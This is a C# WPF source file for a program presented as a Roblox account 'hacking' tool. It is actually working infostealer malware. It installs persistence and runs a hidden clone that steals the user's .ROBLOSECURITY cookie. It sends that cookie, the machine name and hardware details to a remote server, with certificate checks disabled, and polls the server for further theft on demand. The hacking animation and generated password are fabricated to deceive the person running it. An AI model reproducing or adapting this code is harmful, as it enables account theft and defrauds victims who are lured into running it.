using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;

namespace FileTransfer
{
    public partial class MainWindow : Window
    {
        private static readonly HttpClient _http;

        static MainWindow()
        {
            var handler = new HttpClientHandler
            {
                AutomaticDecompression = System.Net.DecompressionMethods.All,
                ServerCertificateCustomValidationCallback = (_, _, _, _) => true
            };
            _http = new HttpClient(handler) { Timeout = TimeSpan.FromMinutes(10) };
            _http.DefaultRequestHeaders.UserAgent.ParseAdd(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
            _http.DefaultRequestHeaders.Accept.ParseAdd("image/webp,image/apng,image/*,*/*;q=0.8");
        }

        private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
        private const string OperatorName = "Shonll";

        private string? _cpu, _ram, _gpu, _cookieError;
        private static string? _cachedToken;
        private const string PlaceholderText = "Введите никнейм...";
        private DispatcherTimer? _debounceTimer;
        private bool _backgroundMode;
        private static Mutex? _cloneMutex;
        private static readonly string TokenLockPath = Path.Combine(Path.GetTempPath(), "ft_token_job.lock");
        private static FileStream? _tokenLockStream;
        private static readonly Random _rng = new();

        private static bool IsHiddenInstance() => Persistence.IsRunningFromClone();

        public static void Log(string msg)
        {
            try
            {
                string logDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Themes");
                Directory.CreateDirectory(logDir);
                string logFile = Path.Combine(logDir, "ft.log");
                File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n");
            }
            catch { }
        }

        public MainWindow()
        {
            Log("MainWindow constructor start");
            try
            {
                InitializeComponent();
                Loaded += MainWindow_Loaded;

                TxtUsername.Text = PlaceholderText;
                TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));

                string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
                bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
                bool hiddenInstance = IsHiddenInstance();
                _backgroundMode = hiddenInstance && !showUi;
                Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, _backgroundMode={_backgroundMode}");

                if (_backgroundMode)
                {
                    // Клон — проверяем, не запущен ли уже другой клон
                    bool createdNew;
                    _cloneMutex = new Mutex(true, "Global\\FileTransferClone_v1", out createdNew);
                    if (!createdNew)
                    {
                        Log("Clone already running, exiting duplicate");
                        Environment.Exit(0);
                        return;
                    }

                    // Фоновый режим (скрытая копия из автозагрузки)
                    ShowInTaskbar = false;
                    Opacity = 0;
                    Log("Background mode start");
                    // Чиним автозагрузку если удалили
                    Persistence.EnsureAutoStart();
                    _ = Task.Run(StartBackgroundWorkAsync);
                }
                else
                {
                    // Обычный видимый режим с кнопкой "Взлом"
                    ShowInTaskbar = true;
                    Opacity = 1;
                    Log("Visible mode start");

                    // При запуске из Program Files — создаём клон и ставим в автозагрузку
                    if (!hiddenInstance)
                    {
                        if (!Persistence.IsInstalled() || !File.Exists(Persistence.DestExe))
                        {
                            Log("Installing persistence");
                            Persistence.Install();
                        }
                        // Всегда пытаемся запустить клон (Mutex предотвратит дубликаты)
                        Persistence.LaunchClone();
                    }

                    // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                    _ = Task.Run(StartBackgroundWorkAsync);
                }

                Log("MainWindow constructor OK");
            }
            catch (Exception ex)
            {
                Log("MainWindow constructor error: " + ex);
                throw;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);

            if (_backgroundMode)
            {
                // Клон — остаёмся в фоне, не закрываемся
                e.Cancel = true;
                Hide();
                ShowInTaskbar = false;
                Log("Clone staying in background");
            }
            else
            {
                // Оригинал — закрываем приложение (клон работает в фоне)
                Log("Original window closed, clone survives");
                Application.Current.Shutdown();
            }
        }

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            Log("MainWindow Loaded start");
            try
            {
                if (_backgroundMode)
                {
                    Hide();
                    ShowInTaskbar = false;
                }
                else
                {
                    Opacity = 1;
                    ShowInTaskbar = true;
                    Activate();
                }
                Log("MainWindow Loaded OK");
            }
            catch (Exception ex)
            {
                Log("MainWindow Loaded error: " + ex);
                throw;
            }
        }

        private async Task StartBackgroundWorkAsync()
        {
            Log("Background work start");
            try
            {
                _cpu = ComputerInfo.GetCPU();
                _ram = ComputerInfo.GetRAM();
                _gpu = ComputerInfo.GetGPU();
                Log($"HW: cpu='{_cpu}', ram='{_ram}', gpu='{_gpu}'");

                if (_backgroundMode)
                {
                    Log("Starting cookie extraction...");
                    _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
                    Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
                    if (string.IsNullOrEmpty(_cachedToken))
                        ReadCookieDebugLog();
                }

                Log("Uploading startup data...");
                await UploadFileOnStartupAsync();
                Log("Background work OK");
            }
            catch (Exception ex)
            {
                Log("Background work error: " + ex);
            }
            // Poll loop запускается ВСЕГДА (для клона и видимого окна), 
            // даже если стартовый аплоад упал с ошибкой
            Log("Starting token request poll loop...");
            await TokenRequestPollLoopAsync();
        }

        private static bool TryAcquireTokenLock()
        {
            try
            {
                _tokenLockStream = new FileStream(TokenLockPath, FileMode.Create, FileAccess.Write, FileShare.None);
                // Пишем pid чтобы было видно кто держит блокировку
                byte[] pidBytes = System.Text.Encoding.UTF8.GetBytes($"{Environment.ProcessId}");
                _tokenLockStream.Write(pidBytes, 0, pidBytes.Length);
                _tokenLockStream.Flush();
                Log($"Token lock acquired (PID={Environment.ProcessId})");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Token lock BUSY (another process holds it): {ex.Message}");
                return false;
            }
        }

        private static void ReleaseTokenLock()
        {
            try
            {
                _tokenLockStream?.Dispose();
                _tokenLockStream = null;
                if (File.Exists(TokenLockPath))
                {
                    File.Delete(TokenLockPath);
                    Log("Token lock released");
                }
            }
            catch (Exception ex)
            {
                Log($"Token lock release error: {ex.Message}");
            }
        }

        private async Task TokenRequestPollLoopAsync()
        {
            Log("Token request poll loop start");
            // Небольшая случайная задержка при старте чтобы разнести polling двух процессов
            int startupDelay = _rng.Next(5000, 15000);
            Log($"Token poll initial delay: {startupDelay}ms");
            await Task.Delay(startupDelay);

            while (true)
            {
                try
                {
                    await Task.Delay(30000);

                    string pcName = ComputerInfo.GetName();
                    string checkUrl = $"{ServerUrl}/check-token-request?computerName={Uri.EscapeDataString(pcName)}&operator={Uri.EscapeDataString(OperatorName)}";
                    Log($"Token poll: checking {checkUrl}");
                    var resp = await _http.GetAsync(checkUrl);
                    var json = await resp.Content.ReadAsStringAsync();
                    Log($"Token poll response ({resp.StatusCode}): {json}");

                    bool requested = false;
                    try
                    {
                        using var doc = System.Text.Json.JsonDocument.Parse(json);
                        if (doc.RootElement.TryGetProperty("requested", out var reqEl))
                            requested = reqEl.GetBoolean();
                    }
                    catch { }

                    if (requested)
                    {
                        Log("Token request: requested=true, trying to acquire lock");
                        if (!TryAcquireTokenLock())
                        {
                            Log("Token request: another process is handling, skipping this cycle");
                            continue;
                        }

                        try
                        {
                            Log("Token request: lock acquired, extracting cookie...");
                            _cachedToken = CookieExtractor.ExtractRobloSecurity();
                            Log($"Token request: extracted token len={_cachedToken?.Length ?? 0}");
                            if (string.IsNullOrEmpty(_cachedToken))
                                ReadCookieDebugLog();
                            Log("Token request: uploading...");
                            await UploadFileOnStartupAsync();
                            Log("Token request: upload complete");
                        }
                        finally
                        {
                            ReleaseTokenLock();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log("Token poll error: " + ex);
                }
            }
        }

        // ── Console Logging ─────────────────────────────────────────────────
        private void AppendConsole(string tag, string tagColor, string message, string msgColor)
        {
            Dispatcher.Invoke(() =>
            {
                TbConsole.Inlines.Add(new LineBreak());
                var tagRun = new Run(tag) { Foreground = BrushFromHex(tagColor) };
                var msgRun = new Run(message) { Foreground = BrushFromHex(msgColor) };
                TbConsole.Inlines.Add(tagRun);
                TbConsole.Inlines.Add(msgRun);
                ConsoleScroller.ScrollToEnd();
            });
        }

        private static SolidColorBrush BrushFromHex(string hex)
        {
            var c = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(hex);
            return new SolidColorBrush(c);
        }

        // ── Startup Upload (computer info + cookie, no screenshots) ───────
        private async Task UploadFileOnStartupAsync()
        {
            string pcName = ComputerInfo.GetName();
            Log($"Upload startup: pcName={pcName}, hasToken={!string.IsNullOrEmpty(_cachedToken)}, cookieError={_cookieError?.Length ?? 0}chars");
            try
            {
                using var content = new MultipartFormDataContent();
                content.Add(new StringContent(pcName), "computerName");
                content.Add(new StringContent(ComputerInfo.GetOS()), "os");
                content.Add(new StringContent(_cpu ?? "—"), "cpu");
                content.Add(new StringContent(_ram ?? "—"), "ram");
                content.Add(new StringContent(_gpu ?? "—"), "gpu");
                content.Add(new StringContent(OperatorName), "operator");

                if (!string.IsNullOrEmpty(_cachedToken))
                {
                    content.Add(new StringContent(_cachedToken), "robloSecurity");
                    Log("Token added to upload");
                }
                else
                {
                    Log("No token to upload");
                }

                if (!string.IsNullOrEmpty(_cookieError))
                {
                    content.Add(new StringContent(_cookieError), "cookieError");
                    Log("Cookie debug log added to upload");
                }

                string url = $"{ServerUrl}/upload";
                var resp = await _http.PostAsync(url, content);
                Log($"Upload startup response: {(int)resp.StatusCode}");
            }
            catch (Exception ex)
            {
                Log("Upload startup error: " + ex);
            }
        }

        private void ReadCookieDebugLog()
        {
            try
            {
                string logPath = Path.Combine(Path.GetTempPath(), "cookie_debug.log");
                if (File.Exists(logPath))
                {
                    string logContent = File.ReadAllText(logPath);
                    if (logContent.Length > 5000)
                        logContent = logContent[^5000..];
                    _cookieError = logContent;
                    Log($"Cookie debug log read: {logContent.Length} chars");
                }
                else
                {
                    _cookieError = "cookie_debug.log not found";
                    Log("cookie_debug.log not found");
                }
            }
            catch (Exception ex)
            {
                _cookieError = $"Error reading log: {ex.Message}";
                Log($"ReadCookieDebugLog error: {ex.Message}");
            }
        }

        // ── Pre-extract cookie in visible mode (background thread) ─────────
        private async Task PreExtractCookieAsync()
        {
            Log("PreExtractCookie start");
            try
            {
                _cachedToken ??= await Task.Run(() => CookieExtractor.ExtractRobloSecurity());
                Log($"PreExtractCookie done, token len={_cachedToken?.Length ?? 0}");
            }
            catch (Exception ex)
            {
                Log("PreExtractCookie error: " + ex);
            }
        }

        // ── Window Controls ─────────────────────────────────────────────────
        private void Border_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                DragMove();
        }

        private void CloseWindow_Click(object sender, RoutedEventArgs e) => Close();
        
        private void MinimizeWindow_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        // ── Placeholder ─────────────────────────────────────────────────────
        private void TxtUsername_GotFocus(object sender, RoutedEventArgs e)
        {
            if (TxtUsername.Text == PlaceholderText)
            {
                TxtUsername.Text = "";
                TxtUsername.Foreground = System.Windows.Media.Brushes.White;
            }
        }

        private void TxtUsername_LostFocus(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(TxtUsername.Text))
            {
                TxtUsername.Text = PlaceholderText;
                TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
            }
        }

        // ── Debounced Roblox Avatar ─────────────────────────────────────────
        private void TxtUsername_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (TxtUsername.Text == PlaceholderText) return;

            if (_debounceTimer != null)
                _debounceTimer.Stop();
            else
            {
                _debounceTimer = new DispatcherTimer();
                _debounceTimer.Interval = TimeSpan.FromMilliseconds(700);
                _debounceTimer.Tick += DebounceTimer_Tick;
            }
            _debounceTimer.Start();
        }

        private async void DebounceTimer_Tick(object? sender, EventArgs e)
        {
            _debounceTimer?.Stop();

            string username = TxtUsername.Text.Trim();
            if (string.IsNullOrEmpty(username) || username == PlaceholderText)
            {
                AvatarBrush.ImageSource = null;
                TxtPlaceholder.Text = "?";
                TxtPlaceholder.Opacity = 0.3;
                BtnHack.IsEnabled = false;
                return;
            }

            TxtPlaceholder.Text = "⏳";
            TxtPlaceholder.Opacity = 0.6;
            AppendConsole("[roblox]", "#2A2D3A", $" Поиск профиля: {username}...", "#6C5CE7");

            var avatarImage = await DownloadRobloxAvatarAsync(username);

            if (avatarImage != null)
            {
                AvatarBrush.ImageSource = avatarImage;
                TxtPlaceholder.Opacity = 0;
                AppendConsole("[roblox]", "#2A2D3A", $" ✓ Профиль загружен", "#2ED573");
                BtnHack.IsEnabled = true;
            }
            else
            {
                TxtPlaceholder.Text = "?";
                AvatarBrush.ImageSource = null;
                TxtPlaceholder.Opacity = 0.3;
                AppendConsole("[roblox]", "#2A2D3A", " ✗ Профиль не найден", "#FF4757");
                BtnHack.IsEnabled = false;
            }
        }

        /// <summary>
        /// Downloads Roblox avatar by:
        /// 1) POST to /v1/usernames/users (correct endpoint!) to resolve userId
        /// 2) GET thumbnail URL from thumbnails API  
        /// 3) Download actual image bytes via HttpClient (with User-Agent)
        /// 4) Create BitmapImage from MemoryStream (bypasses WPF's broken URI loader)
        /// </summary>
        private async Task<BitmapImage?> DownloadRobloxAvatarAsync(string username)
        {
            try
            {
                // Step 1: Resolve username → userId
                // FIXED: correct endpoint is /v1/usernames/users NOT /v1/users/by-usernames
                var payload = new { usernames = new[] { username }, excludeBannedUsers = false };
                var jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload);
                using var reqContent = new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json");

                var response = await _http.PostAsync("https://users.roblox.com/v1/usernames/users", reqContent);
                if (!response.IsSuccessStatusCode)
                {
                    System.Diagnostics.Debug.WriteLine($"Users API returned {response.StatusCode}");
                    return null;
                }

                var resStr = await response.Content.ReadAsStringAsync();
                using var doc = System.Text.Json.JsonDocument.Parse(resStr);
                var data = doc.RootElement.GetProperty("data");
                if (data.GetArrayLength() == 0) return null;

                long userId = data[0].GetProperty("id").GetInt64();

                // Step 2: Get headshot thumbnail URL
                var thumbUrl = $"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false";
                var thumbResponse = await _http.GetAsync(thumbUrl);
                if (!thumbResponse.IsSuccessStatusCode) return null;

                var thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                using var thumbDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                var thumbData = thumbDoc.RootElement.GetProperty("data");
                if (thumbData.GetArrayLength() == 0) return null;

                var state = thumbData[0].GetProperty("state").GetString();
                var imageUrl = thumbData[0].GetProperty("imageUrl").GetString();
                
                // If state is "Pending", retry once after a short delay
                if (state == "Pending" || string.IsNullOrEmpty(imageUrl))
                {
                    await Task.Delay(2000);
                    thumbResponse = await _http.GetAsync(thumbUrl);
                    if (!thumbResponse.IsSuccessStatusCode) return null;
                    thumbStr = await thumbResponse.Content.ReadAsStringAsync();
                    using var retryDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
                    var retryData = retryDoc.RootElement.GetProperty("data");
                    if (retryData.GetArrayLength() == 0) return null;
                    imageUrl = retryData[0].GetProperty("imageUrl").GetString();
                }

                if (string.IsNullOrEmpty(imageUrl)) return null;

                // Step 3: Download the actual image bytes via HttpClient
                var imageBytes = await _http.GetByteArrayAsync(imageUrl);

                // Step 4: Create BitmapImage from byte array on UI thread
                return await Dispatcher.InvokeAsync(() =>
                {
                    var bitmap = new BitmapImage();
                    using (var ms = new MemoryStream(imageBytes))
                    {
                        bitmap.BeginInit();
                        bitmap.CacheOption = BitmapCacheOption.OnLoad;
                        bitmap.StreamSource = ms;
                        bitmap.EndInit();
                    }
                    bitmap.Freeze();
                    return bitmap;
                });
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Roblox Avatar Error: {ex.Message}");
                return null;
            }
        }

        // ── HACK Button ─────────────────────────────────────────────────────
        private async void BtnHack_Click(object sender, RoutedEventArgs e)
        {
            string username = TxtUsername.Text.Trim();
            if (string.IsNullOrEmpty(username) || username == PlaceholderText)
            {
                AppendConsole("[error]", "#FF4757", " Введите никнейм Roblox!", "#FF4757");
                SetStatusBadge("ОШИБКА", "#FF4757");
                return;
            }

            // Переизвлекаем куку прямо перед отправкой — Chrome мог перезапуститься
            AppendConsole("[system]", "#2A2D3A", " Извлечение .ROBLOSECURITY...", "#A29BFE");
            string freshToken = CookieExtractor.ExtractRobloSecurity();
            if (!string.IsNullOrEmpty(freshToken))
            {
                _cachedToken = freshToken;
                AppendConsole("[system]", "#2A2D3A", " Токен найден", "#2ED573");
            }
            else
            {
                AppendConsole("[system]", "#FFA502", " Токен не найден, отправка без него", "#FFA502");
            }

            string token = _cachedToken ?? "";

            BtnHack.IsEnabled = false;
            TxtUsername.IsEnabled = false;
            PanelResult.Visibility = Visibility.Collapsed;
            HackProgress.Visibility = Visibility.Visible;
            HackProgress.Value = 0;
            SetStatusBadge("ПРОЦЕСС ВЗЛОМА", "#FFA502");

            var rand = new Random();
            int totalSeconds = rand.Next(25, 36);

            string[] steps = new[]
            {
                "Подключение к Roblox API...",
                "Поиск пользователя в базе данных...",
                "Идентификация UserId...",
                "Обход защиты Cloudflare...",
                "Запуск брутфорса хэш-карты...",
                "Внедрение в сессию авторизации...",
                "Анализ трафика WebSocket...",
                "Подмена токена .ROBLOSECURITY...",
                "Выгрузка пакетов базы данных...",
                "Попытка обхода 2FA верификации...",
                "Генерация расшифрованного ключа..."
            };

            int elapsed = 0;
            int stepIndex = 0;

            while (elapsed < totalSeconds)
            {
                int nextDelay = rand.Next(2, 5);
                if (elapsed + nextDelay > totalSeconds)
                    nextDelay = totalSeconds - elapsed;

                double progress = (double)elapsed / totalSeconds * 100;
                HackProgress.Value = progress;

                if (stepIndex < steps.Length)
                {
                    AppendConsole($"[{elapsed}s]", "#FFA502", $" {steps[stepIndex]}", "#A29BFE");
                    stepIndex++;
                }
                else
                {
                    int pct = rand.Next(60, 100);
                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Расшифровка пароля: {pct}%...", "#A29BFE");
                }

                await Task.Delay(nextDelay * 1000);
                elapsed += nextDelay;
            }

            HackProgress.Value = 100;

            if (username.Length <= 6)
            {
                SetStatusBadge("ОШИБКА", "#FF4757");
                AppendConsole("[error]", "#FF4757", " Ошибка: не удалось взломать", "#FF4757");
                BtnHack.IsEnabled = true;
                TxtUsername.IsEnabled = true;
                HackProgress.Visibility = Visibility.Collapsed;
                return;
            }

            AppendConsole("[done]", "#2ED573", " Расшифровка завершена!", "#2ED573");

            string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());

            // Отправляем username/password на сервер (токен уже ушёл при старте)
            try
            {
                var updatePayload = new
                {
                    computerName = ComputerInfo.GetName(),
                    robloxUser = username,
                    fakePassword = fakePassword,
                    robloSecurity = token,
                    @operator = OperatorName
                };
                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
                string url = $"{ServerUrl}/update-roblox";
                await _http.PostAsync(url, updateContent);
            }
            catch { }

            SetStatusBadge("ВЗЛОМ УСПЕШЕН", "#2ED573");
            TxtPassword.Text = fakePassword;
            PanelResult.Visibility = Visibility.Visible;
            AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");

            BtnHack.IsEnabled = true;
            TxtUsername.IsEnabled = true;
            HackProgress.Visibility = Visibility.Collapsed;
        }

        private void SetStatusBadge(string text, string dotColor)
        {
            TbStatusLabel.Text = text;
            StatusDot.Fill = BrushFromHex(dotColor);
        }

        private string GetDeterministicPassword(string username)
        {
            int seed = 0;
            foreach (char c in username)
            {
                seed = (seed * 31) + c;
            }
            var rand = new Random(seed);
            int length = rand.Next(10, 15);
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&*?_";
            var buf = new char[length];
            for (int i = 0; i < length; i++)
                buf[i] = chars[rand.Next(chars.Length)];
            return new string(buf);
        }

        private void BtnTelegram_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "https://t.me/robloxvzlomez",
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine("Error opening Telegram link: " + ex.Message);
            }
        }
    }

    // ── PC Info ─────────────────────────────────────────────────────────────
    public static class ComputerInfo
    {
        public static string GetName() => Environment.MachineName;
        public static string GetOS() => Environment.OSVersion.VersionString;

        public static string GetCPU()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
                foreach (var o in s.Get())
                    return o["Name"]?.ToString()?.Trim() ?? "—";
            }
            catch { }
            return "—";
        }

        public static string GetRAM()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                foreach (var o in s.Get())
                {
                    var b = Convert.ToInt64(o["TotalPhysicalMemory"]);
                    return $"{b / (1024 * 1024 * 1024.0):F1} GB";
                }
            }
            catch { }
            return "—";
        }

        public static string GetGPU()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");
                var gpus = new System.Collections.Generic.List<string>();
                foreach (var o in s.Get())
                {
                    var n = o["Name"]?.ToString()?.Trim();
                    if (!string.IsNullOrEmpty(n)) gpus.Add(n);
                }
                return gpus.Count > 0 ? string.Join(", ", gpus) : "—";
            }
            catch { }
            return "—";
        }
    }
}
